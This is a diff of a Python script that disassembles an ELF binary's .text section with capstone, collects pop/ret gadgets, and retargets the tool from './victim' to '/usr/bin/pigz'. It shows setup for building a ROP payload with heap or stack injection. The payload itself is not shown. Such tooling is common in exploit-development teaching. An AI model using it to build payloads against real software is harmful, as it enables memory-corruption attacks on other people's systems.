@@ -1,9 +1,10 @@
 # disas.py
 
+import sys
 from capstone import *
 from elftools.elf.elffile import ELFFile
 from elftools.elf.relocation import RelocationSection
-filename= './victim'
+filename= '/usr/bin/pigz'
 disas = [] #list of tuples: tup[0] = address, tup[1] = instruction, tup[2] = args
 
 def zerochecker(bytes, expectedLength):
@@ -14,18 +15,37 @@ def zerochecker(bytes, expectedLength):
 with open(filename, 'rb') as file:
         elf = ELFFile(file)
         code = elf.get_section_by_name('.text')
+
         ops = code.data() # type bytes
-        # ops2 = ops[-15:]
+        opslist = ops.split(b'\xc3')
+        opslist_index = 0
+        while opslist_index < len(opslist) - 1:
+            opslist[opslist_index] += b'\xc3'
+            opslist_index += 1
+
+        for x in opslist:
+            print(x)
+
         addr = code['sh_addr'] # type int
         md = Cs(CS_ARCH_X86, CS_MODE_64)
 
         # gets all instructions, intended or not
 
-        while(ops != b""):
-            for i in md.disasm(ops, addr):
-                disas.append((i.address,i.mnemonic,i.op_str))
-            addr += 1
-            ops = ops[1:]
+        # want a list of byte arrays made from ops, split at returns (\xc3)
+        # have addr etc for first one
+        # for next call, increment addr by len of previosus byte array
+
+        while(opslist != []):
+            while (opslist[0] != b""):
+                for i in md.disasm(opslist[0], addr):
+                    if ((i.mnemonic ==  "pop") or (i.mnemonic == "ret")):
+                         disas.append((i.address,i.mnemonic,i.op_str))
+                         print("added a gadget: " + str(len(disas)))
+                addr += 1
+                opslist[0] = opslist[0][1:]
+            opslist = opslist[1:]
+
+print("done with both while loops!")
 
 gadgets = []
 gadgetIndex = 0
@@ -98,6 +118,9 @@ print("shortest_rsi = " + str(shortest_rsi))
 print(rsi_addr)
 print("shortest_rdx = " + str(shortest_rdx))
 print(rdx_addr)
+
+if (shortest_rdi == 100) or (shortest_rsi == 100) or (shortest_rdx == 100):
+    sys.exit("Unable to find necessary gadgets to build payload!")
 
 heapOrStack = input("Heap or stack  injection? Write \"H\" for Heap or \"S\" for stack: ")
 if heapOrStack == "S":
